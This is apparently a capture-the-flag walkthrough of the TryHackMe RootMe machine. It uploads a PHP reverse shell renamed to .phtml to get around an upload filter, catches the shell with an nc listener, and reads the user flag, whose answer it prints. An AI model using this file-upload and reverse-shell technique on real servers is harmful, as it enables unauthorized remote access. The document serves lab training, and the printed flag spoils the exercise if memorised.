@@ -1,0 +1,24 @@
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+
+cd php-reverse-shell
+
+nano php-reverse-shell.php
+$VERSION = "1.0";
+$ip = '{MACHINE-IP}';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+
+change extension from php to phtml then upload
+
+nc -lvnp 4444
+
+navigate to http://{MACHINE-IP}/uploads and click on file we just upload, back to terminal we will get a reverse shell
+connect to [10.9.3.230] from (UNKNOWN) [10.10.227.78] 50102
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 04:49:14 up 48 min,  0 users,  load average: 0.00, 0.00, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ find / -type f -name user.txt
+/var/www/user.txt
+$ cat /var/www/user.txt
+THM{y0u_g0t_a_sh3ll}
